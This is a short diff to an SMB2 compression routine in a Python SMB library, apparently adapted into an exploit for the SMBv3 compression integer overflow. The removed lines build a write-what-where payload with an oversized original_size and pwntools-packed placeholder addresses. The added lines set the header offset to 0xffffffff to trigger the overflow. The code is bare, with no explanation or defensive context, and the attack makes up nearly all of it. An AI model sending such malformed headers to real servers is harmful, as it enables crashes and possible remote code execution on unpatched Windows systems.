@@ -3,7 +3,6 @@
 # MIT License (see LICENSE or https://opensource.org/licenses/MIT)
 
 from __future__ import division
-from pwn import *
 
 global g_count
 g_count = 0
@@ -1448,14 +1447,9 @@
 
     def _compress(self, b_data, session):
         header = SMB2CompressionTransformHeader()
-        header['original_size'] = 4294967295 #0xffffffff
-	what = p64(0xdeadbeefdeadbeef)
-	where = p64(0x4141414141414141)
-        my_data = os.urandom(0x1100 - len(what))
-	my_data += 0x18 * "\x00"
-	my_data += where
-        header['offset'] = len(what)
-        header['data'] = (what + smbprotocol.lznt1.compress(my_data))
+        header['original_size'] = len(b_data)
+        header['offset'] = 4294967295
+        header['data'] = smbprotocol.lznt1.compress(b_data)
 
         return header
